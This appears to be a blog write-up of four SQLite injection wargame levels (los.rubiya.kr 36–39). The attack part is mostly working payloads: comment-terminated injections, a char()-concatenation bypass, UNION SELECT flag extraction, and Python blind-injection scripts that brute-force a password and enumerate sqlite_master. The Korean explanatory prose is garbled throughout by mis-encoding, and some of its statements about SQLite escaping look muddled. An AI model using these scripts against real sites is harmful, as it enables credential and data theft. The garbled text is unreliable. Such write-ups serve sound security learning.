---
title: "[LOS] 36-39ë²ˆ ë¬¸ì œ í’€ì´(chupacabra,manticore,banshee,poltergeist)"
categories:
  - los
tags:
  - los
  - rubiya
  - los 36ë²ˆ
  - los 37ë²ˆ
  - los 38ë²ˆ
  - los 39ë²ˆ
  - los chupacabra
  - los manticore
  - los banshee
  - los poltergeist
  - sqllite 


  
toc: true
toc_sticky: true
toc_label: "36-39ë²ˆ ë¬¸ì œ í’€ì´"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/sql.png
---

ğŸ’¡ los.rubiya.kr 36-39ë²ˆ ë¬¸ì œì— ëŒ€í•œ í’€ì´ì…ë‹ˆë‹¤. 
{: .notice--warning}


# 36ë²ˆ(chupacabra)
## ë¬¸ì œ

![image](https://user-images.githubusercontent.com/33647663/167242766-c019ebaf-c149-4bab-808a-798b6d398598.png)



## í’€ì´

ê¸°ì¡´ mysqlì—ì„œì˜ DBì™€ ëª‡ ê°€ì§€ ë¬¸ë²•ë§Œ ë‹¤ë¥´ê³  ëŒ€ë¶€ë¶„ ë™ì¼í•œ ë¡œì§ìœ¼ë¡œ ì¸ì ì…˜ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.

í˜„ì¬ ìƒí™©ì—ì„œ í•„í„°ë§ì´ ì—†ìœ¼ë¯€ë¡œ, ë¬¸ìì—´ì„ escapeí•œ ë’¤, ë‚˜ë¨¸ì§€ ë¶€ë¶„ì„ ì£¼ì„ì²˜ë¦¬ í•´ì¤ë‹ˆë‹¤.

payload = ```id=admin' -- ```

![image](https://user-images.githubusercontent.com/33647663/167242811-a4fb5853-123a-47da-8b64-7fa10a6e64da.png)


# 37ë²ˆ(manticore)
## ë¬¸ì œ

![image](https://user-images.githubusercontent.com/33647663/167243414-d52ff620-1ab9-4207-8fab-4009adad16c7.png)

manticore ë¬¸ì œëŠ” ì´ì „ ë¬¸ì œì—ì„œ addslashes() í•¨ìˆ˜ë¥¼ í†µí•´ì„œ single quote ë“±ì˜ íŠ¹ìˆ˜ë¬¸ìì…ë ¥ì‹œ escape ì²˜ë¦¬ë¥¼ í•˜ë„ë¡ ìœ ë„í•œ ê²ƒìœ¼ë¡œ ë³´ì…ë‹ˆë‹¤. 

í•˜ì§€ë§Œ mysql ì—ì„œëŠ” escape ì²˜ë¦¬ë¥¼ ìœ„í•´ì„œ '\\' ë¬¸ìë¥¼ ì…ë ¥í•´ ì£¼ë©´ ë˜ì—ˆì§€ë§Œ, sqliteì—ì„œëŠ” ë‹¤ìŒê³¼ ê°™ì´ íŠ¹ìˆ˜ë¬¸ìì— ë”°ë¼ì„œ escape ë¬¸ìê°€ ë‹¤ë¦…ë‹ˆë‹¤.

```java
public static String sqliteEscape(String keyWord){
    keyWord = keyWord.replace("/", "//");
    keyWord = keyWord.replace("'", "''");
    keyWord = keyWord.replace("[", "/[");
    keyWord = keyWord.replace("]", "/]");
    keyWord = keyWord.replace("%", "/%");
    keyWord = keyWord.replace("&","/&");
    keyWord = keyWord.replace("_", "/_");
    keyWord = keyWord.replace("(", "/(");
    keyWord = keyWord.replace(")", "/)");
    return keyWord;
}

```

ì¦‰ ì´ë²ˆ ë¬¸ì œì—ì„œ ë¬¸ìì—´ íƒˆì¶œì„ ìœ„í•´ì„œ single quoteì˜ escape ì²˜ë¦¬ë¥¼ ë§‰ì€ ê²ƒì²˜ëŸ¼ ë³´ì´ì§€ë§Œ, single quoteì— ëŒ€í•œ escape ë¬¸ìëŠ” '\'' ì´ë¯€ë¡œ, ë¬¸ìì—´ì„ íƒˆì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.


## í’€ì´

id = admin' ì„ ì…ë ¥í•œë‹¤ê³  ê°€ì •í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ ```admin\```ì˜ ë°ì´í„°ë¥¼ ì°¾ê²Œ ë©ë‹ˆë‹¤. ë”°ë¼ì„œ ì´ë²ˆì—ëŠ” ë¬¸ìì—´ì— '\\' ë¬¸ìê°€ ì¶”ê°€ë¡œ ë¶™ëŠ” ë‹¤ëŠ” ì ì„ ì¸ì§€í•˜ì—¬ ìš°íšŒí•˜ë©´ ë©ë‹ˆë‹¤.

ë‹¤ìŒê³¼ ê°™ì´ payloadë¥¼ ì‘ì„±í•˜ì—¬ ì¸ì ì…˜ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.

```
id=' or id=char(97)||char(100)||char(109)||char(105)||char(110)--
```

![image](https://user-images.githubusercontent.com/33647663/167243620-6c30a997-6a7c-4f3a-89ed-5d87d1e6c328.png)


# 38ë²ˆ(banshee)
## ë¬¸ì œ

![image](https://user-images.githubusercontent.com/33647663/167244150-4e218c7b-717f-4d6e-a037-0a9cfd275748.png)

í•„í„°ë§ì´ ì—†ëŠ” ì „í˜•ì ì¸ blind sql injection ë¬¸ì œì…ë‹ˆë‹¤.

ê¸°ì¡´ mysqlì—ì„œ sqliteë¬¸ë²•ë§Œ ê³ ë ¤í•´ì„œ í˜ì´ë¡œë“œë¥¼ ì‘ì„±í•´ ì¤ë‹ˆë‹¤.

## í’€ì´

ì½”ë“œë¥¼ ë³´ì‹œë©´ ì•Œê² ì§€ë§Œ, ê¸°ì¡´ mysqlê³¼ ë¬¸ë²•ì´ ëŒ€ë¶€ë¶„ ì¼ì¹˜í•©ë‹ˆë‹¤.

```python
import requests
import string

url = 'https://los.rubiya.kr/chall/banshee_ece938c70ea2419a093bb0be9f01a7b1.php'
cookies = {'PHPSESSID' : '7jocdhdj9b00ob8q1cfc13oos6'}
params= {'pw' : None}

pw_len = 0
for i in range(1,30):
    params['pw'] = "' or id='admin' and length(pw) = {}-- ".format(i)
    response = requests.get(url,cookies=cookies,params=params)
    print(params)
    if response.text.count("login success!") == 1:
        print("length(pw) == {}".format(i))
        pw_len = i
        break
domain = string.digits + string.ascii_lowercase 

pw = ''
for i in range(1,pw_len + 1):
    for j in domain:
        params['pw'] = "' or id='admin' and substr(pw,{},1) = '{}' -- ".format(i,j)
        print(params)  
        response = requests.get(url,cookies=cookies,params=params)
        if response.text.count("login success!") == 1:
            pw += j
            print("find the pw : {}".format(pw))
            break

```

ì½”ë“œ ì‹¤í–‰ê²°ê³¼ ë‹¤ìŒê³¼ ê°™ì´ pwë¥¼ íšë“í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/167244237-f0cecab2-c3cb-44a1-955c-33ce0b9afd7d.png)


![image](https://user-images.githubusercontent.com/33647663/167244253-c7005f5e-bd7e-42f4-8baa-65d09cef8e53.png)

# 39ë²ˆ(poltergeist)
## ë¬¸ì œ

![image](https://user-images.githubusercontent.com/33647663/167244300-1b9dc7c5-ad00-4b3f-a7fd-d120f18ab8b3.png)

ì£¼ì„ì— ìˆëŠ” íŒíŠ¸ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

```
// Flag is in `flag_{$hash}` table, not in `member` table. Let's look over whole of the database.
```

blind sql injectionì„ ìˆ˜í–‰í•˜ë˜, í˜„ì¬ í…Œì´ë¸”ì´ ì•„ë‹Œ ë‹¤ë¥¸ í…Œì´ë¸”ì— ìˆëŠ” ë°ì´í„°ë¥¼ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤.

## í’€ì´

mysqlì€ information_schema.tablesë¥¼ ì´ìš©í•´ì„œ ë‹¤ë¥¸ í…Œì´ë¸”ì˜ ì •ë³´ë¥¼ ê°€ì ¸ì™”ë‹¤ë©´, sqliteëŠ” sqlite_master í…Œì´ë¸”ì—ì„œ ë‹¤ë¥¸ í…Œì´ë¸”ì˜ ì •ë³´ë¥¼ ì €ì¥í•˜ê³  ìˆìŠµë‹ˆë‹¤.

sqlite_master í…Œì´ë¸”ì˜ ìŠ¤í‚¤ë§ˆëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

```sql
CREATE TABLE sqlite_master (
  type TEXT,
  name TEXT,
  tbl_name TEXT,
  rootpage INTEGER,
  sql TEXT
);
```

**í…Œì´ë¸” ì •ë³´ ê°€ì ¸ì˜¤ê¸°**
- ```SELECT tbl_name FROM sqlite_master ```

**ì»¬ëŸ¼ ì •ë³´ ê°€ì ¸ì˜¤ê¸°**
- ```SELECT sql FROM sqlite_master WHERE tbl_name='Table_Nmae'```
- sql ì •ë³´ëŠ” 'Table_Name' í…Œì´ë¸”ì„ ë§Œë“¤ ë•Œ ì‚¬ìš©í•œ create sqlë¬¸ì„ ë‹´ê³  ìˆìŠµë‹ˆë‹¤. ë³„ë„ì˜ ì»¬ëŸ¼ ëª…ì´ ë”°ë¡œ ì €ì¥ë˜ì§€ ì•Šê¸° ë•Œë¬¸ì— í•´ë‹¹ ì •ë³´ì—ì„œ column ëª…ì„ ê°€ì ¸ì™€ì•¼ í•©ë‹ˆë‹¤.


**í…Œì´ë¸”ëª… ê°€ì ¸ì˜¤ëŠ” ì½”ë“œ**

```python
pw_len = 0
for i in range(5,30):
    params["pw"] = "' or length((select tbl_name from sqlite_master limit 1,1)) = {} --".format(i)
    response = requests.get(url,params=params,cookies=cookies)
    print(params)
    if "Hello guest" in response.text:
        print("find the pw_len ", i)
        pw_len = i
        break

domain = string.digits + string.ascii_lowercase
# í…Œì´ë¸” ëª…
table_name = 'flag_'
for i in range(6,pw_len + 1):
    for j in domain:
        params["pw"] = "' or substr((select tbl_name from sqlite_master limit 1,1),{},1) = '{}'-- ".format(i,j)
        response = requests.get(url,params=params,cookies=cookies)
        print(params)
        if "Hello guest" in response.text:
            table_name += j
            print("find the table_name ", table_name)
            break
```

=> í…Œì´ë¸” ëª… : flag_70c81d99

**ì»¬ëŸ¼ ëª… ê°€ì ¸ì˜¤ëŠ” ì½”ë“œ**

```python
# sql ë¬¸ ì•Œì•„ë‚´ê¸° - ì´ì§„ íƒìƒ‰ ì´ìš©
sql = "CREATE TABLE flag_70c81d99"
for i in range(28,100):
    start,end= 0,127
    while True:
        search = (start + end) // 2
        params["pw"] = "' or unicode(substr((select sql from sqlite_master where tbl_name='flag_70c81d99'),{},1)) <= {}-- ".format(i,search)
        response = requests.get(url,params=params,cookies=cookies)
        print(params)
        if "Hello guest" in response.text:
            params["pw"] = "' or unicode(substr((select sql from sqlite_master where tbl_name='flag_70c81d99'),{},1)) = {}-- ".format(i,search)
            response = requests.get(url,params=params,cookies=cookies)
            print(params)
            if "Hello guest" in response.text:
                sql += chr(search)
                print("[{}] : {}".format(i,sql))
                break
            end = search
        else:
            start = search
```

=> ì»¬ëŸ¼ ëª… : flag_0876285c

![image](https://user-images.githubusercontent.com/33647663/167245939-94ab23df-33e3-44cf-a83e-d3a50557130c.png)


í…Œì´ë¸” ëª…ê³¼, ì»¬ëŸ¼ ëª…ì„ êµ¬í–ˆìœ¼ë‹ˆ í•´ë‹¹ ì»¬ëŸ¼ì— ìˆëŠ” ë°ì´í„°ëŠ” union select êµ¬ë¬¸ì„ ì´ìš©í•´ì„œ í•œ ë²ˆì— ì•Œì•„ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```pw = ' union select flag_0876285c from flag_70c81d99 --```

![image](https://user-images.githubusercontent.com/33647663/167246114-4e220082-7d94-4b2b-a3fc-b2a2f35269a0.png)



